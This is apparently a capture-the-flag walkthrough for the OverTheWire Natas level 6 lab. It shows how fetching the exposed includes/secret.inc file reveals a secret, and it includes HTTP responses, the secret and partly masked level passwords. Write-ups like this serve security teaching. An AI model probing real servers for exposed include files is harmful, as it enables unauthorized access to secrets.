# level 6

**Host**: http://natas6.natas.labs.overthewire.org
>natas6:0RoJwHdSKWFTYR5WuiAewa**********

When you visit the site, you get a prompt saying "Input secret":

```
Input secret: 
```

### Solution:

When you click on the `View source` button on the page you get following php code:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

The interesting part is the `include "includes/secret.inc";` so we send a request to `http://natas6.natas.labs.overthewire.org/includes/secret.inc` and get the response with the secret back:

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 16:56:29 GMT
Server: Apache/2.4.58 (Ubuntu)
Last-Modified: Fri, 15 Aug 2025 13:06:37 GMT
ETag: "27-63c670f646ac3"
Accept-Ranges: bytes
Content-Length: 39
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

When you submit the secret you get the password for natas7 in the response:

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 16:59:33 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1065
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas6</h1>
<div id="content">

Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNE**********
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```